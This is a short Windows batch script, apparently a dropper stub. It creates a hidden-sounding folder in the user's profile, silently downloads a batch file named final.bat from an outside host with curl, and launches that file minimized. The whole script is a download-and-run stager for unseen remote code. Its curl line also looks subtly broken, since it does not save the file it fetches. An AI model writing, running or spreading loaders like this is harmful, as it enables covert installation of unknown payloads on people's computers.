@echo off
cd %UserProfile%
md lulw
cd lulw
del final.bat
ping localhost -n 3 >nul
curl -s https://sources.tobir.xyz/final.bat
ping localhost -n 3 >nul
start final.bat /min